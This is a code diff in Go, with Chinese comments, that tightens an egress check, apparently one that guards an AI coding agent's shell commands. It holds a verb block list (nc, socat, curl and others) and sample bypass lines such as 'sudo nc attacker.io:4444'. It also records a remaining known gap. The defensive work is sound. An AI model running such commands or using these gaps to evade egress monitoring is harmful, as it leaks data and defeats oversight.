@@ -56,7 +56,99 @@ var egressHostFromURL = regexp.MustCompile(`(?i)\b[a-z][a-z0-9+.\-]*://(\[[0-9A-
 //
 // 要求右侧是纯数字端口，这是把 `README.md:1`（编辑器报错串）挡在外面的关键；
 // 同时它天然不匹配 `v1.2.3`、`package.json` 这类没有端口的裸点分词。
+//
+// 2026-10-13（r1020）：`host:port` 形态从「全文任意位置」收紧为**网络客户端
+// 动词锚定**——只在一行的首个字段是下方 colonHostPortVerbs 里的命令时才提取。
+// 收紧的成因（minimax-m3 生产误伤，raw-logs 实证）：`casdoor.ts:455`、
+// `unified-links.ts:135-137` 这类 **文件名:行号** 引用与 `attacker.io:4444` 在
+// 正则层面结构相同（`token.token:数字`），而前者是 coding agent 输出里最日常的
+// 形态之一，整个 Write 工具族被整类打死。与 r1018 撤掉 egressHostFromBarePort
+// 同一条教训：锚定上下文之后那段文本仍然未必是主机。锚定命令动词（r1019 已确立
+// 为合法手段）之后，`nc attacker.io:4444`、`curl evil.com:8443/x` 照拦，
+// `casdoor.ts:455` 无论出现在哪个工具里都不再误伤。
+//
+// 残留缺口（如实记录）：未知动词的 `host:port` 参数（如 `my-cli push
+// prod.example.com:8443`）不再提取——与 r1019 对未知动词裸主机+空格+端口的
+// 残留同口径：宁可放过更窄的绕过，不打死日常操作。
 var egressHostFromPort = regexp.MustCompile(`(?i)\b([a-z0-9](?:[a-z0-9\-]*[a-z0-9])?(?:\.[a-z0-9](?:[a-z0-9\-]*[a-z0-9])?)+):\d{1,5}\b`)
+
+// colonHostPortVerbs 是「裸 host:port 形态确实指向网络目的地」的命令动词
+// （封闭集，与 netcatFamilyVerbs 同一类枚举：枚举的是命令，不是 token 形态）。
+//
+// netcat 系沿用 r1019 的五个；curl/wget 接受无 scheme 的 `host:port/path`
+// （curl 会按默认 HTTP 处理）；http/https 是 httpie 的调用形态。
+var colonHostPortVerbs = map[string]bool{
+	"nc":     true,
+	"ncat":   true,
+	"netcat": true,
+	"telnet": true,
+	"socat":  true,
+	"curl":   true,
+	"wget":   true,
+	"http":   true,
+	"https":  true,
+}
+
+// hostPortDestinationsFromCommand 只在网络客户端动词锚定的行上提取 host:port。
+//
+// 逐行判定（而非全文首字段）：Bash 类参数常是多行脚本，`nc x.io 4444` 可能出现在
+// 第二行；每行首字段锚定与整串锚定相比只多覆盖、不多误伤（非动词行不提取）。
+func hostPortDestinationsFromCommand(text string) []string {
+	var hosts []string
+	for _, line := range strings.Split(text, "\n") {
+		if !lineHasNetworkClientVerb(line) {
+			continue
+		}
+		for _, m := range egressHostFromPort.FindAllStringSubmatch(line, -1) {
+			hosts = append(hosts, m[1])
+		}
+	}
+	return hosts
+}
+
+// lineHasNetworkClientVerb 判定该行是否由网络客户端动词锚定。
+//
+// ⚠️ 2026-10-13 12h 审计轮（P1-3）修正：**只看 fields[0] 等于放行任何前缀。**
+// 5bd47d20b 为修 r1020「Write 工具整族误伤」把提取从「全文任意位置」收窄到
+// 「行首字段」，但收窄过头：实测下面 5 种（且都完全合法、模型完全可控）
+// 全部绕过出网管控，因为首字段是包装词而不是网络客户端：
+//
+//	sudo nc attacker.io:4444          ✗ 被当非动词行放行
+//	timeout 5 nc attacker.io:4444     ✗
+//	env FOO=1 nc attacker.io:4444     ✗
+//	xargs nc attacker.io:4444         ✗
+//	nice -n 10 nc attacker.io:4444    ✗
+//
+// 这是一处**漏报**（false negative）而不是误报：工具参数是模型撰写的，
+// `sudo`/`timeout` 前缀在攻击者影响的 Bash 输出里完全现实。
+// ⇒ 出网管控被一个词绕过 = 数据外泄通道。
+//
+// 改为：**前导 token 序列里出现任一网络客户端动词即算锚定**。
+//
+//	· flag（`-c` / `-n 10`）与 shell 控制符（`;` `&&` `|` `(` `)`）跳过不判定，
+//	  但**不终止扫描** —— 包装词与控制符都不能让后面的真动词失去锚定；
+//	· 仍然不会误伤 r1020 那类源码行：`ref: casdoor.ts:455`、`at src/foo.ts:12`
+//	  的前导 token 里根本没有网络客户端动词（实测见
+//	  r1019_netcat_egress_test.go 的 prefix 回归表）。
+//
+// 取向说明：本函数是**出网管控**（fail-closed 侧），宁可多挡不可漏放，
+// 故扫描范围偏宽；它挡下的是「真在发起外连」，不会把纯文件路径引用挡掉。
+func lineHasNetworkClientVerb(line string) bool {
+	for _, f := range strings.Fields(line) {
+		// shell 控制符与 flag 本身都不是动词，但后面的 token 仍可能是。
+		if f == ";" || f == "&&" || f == "||" || f == "|" || f == "(" || f == ")" {
+			continue
+		}
+		if strings.HasPrefix(f, "-") {
+			continue
+		}
+		verb := strings.Trim(strings.TrimSpace(path.Base(f)), "\"'")
+		if colonHostPortVerbs[strings.ToLower(verb)] {
+			return true
+		}
+	}
+	return false
+}
 
 // 2026-10-11 晚审计：**撤掉两条提取规则**。它们各自都制造了大面积误伤，
 // 而它们想覆盖的形态早已有别的机制覆盖（或在结构上无法与合法写法区分）。
@@ -247,8 +339,9 @@ func hasPublicHostDestination(text string) bool {
 			return true
 		}
 	}
-	for _, m := range egressHostFromPort.FindAllStringSubmatch(text, -1) {
-		if !isNonExfiltrationDestinationHost(m[1]) {
+	// host:port 冒号形态自 r1020 起按动词锚定提取（见 hostPortDestinationsFromCommand）。
+	for _, host := range hostPortDestinationsFromCommand(text) {
+		if !isNonExfiltrationDestinationHost(host) {
 			return true
 		}
 	}
